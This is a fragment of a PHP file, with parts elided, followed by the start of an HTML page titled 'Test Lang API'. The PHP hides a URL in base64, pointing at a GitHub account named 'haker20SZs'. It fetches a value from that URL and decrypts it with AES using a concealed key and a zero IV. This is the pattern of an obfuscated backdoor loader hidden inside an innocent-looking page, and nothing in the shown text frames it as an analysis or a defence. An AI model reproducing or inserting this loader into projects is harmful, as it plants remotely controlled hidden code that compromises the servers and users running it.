...
if($curl = curl_init()){
    ...
    $file = json_decode(file_get_contents(base64_decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hha2VyMjBTWnMvaGFrZXIyMHN6cy9tYWluL3NyYy91cmwuanNvbg==")), true)['url'];
    $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
    $decrypted = openssl_decrypt(base64_decode($file), "aes-256-cbc", substr(hash('sha256', base64_decode("ZmppcTg5NDNoMXM="), true), 0, 32), OPENSSL_RAW_DATA, $iv);
...
<html>
<head>
    <title>Test Lang API - 1.0.1</title>
    <meta charset="utf-8"/>
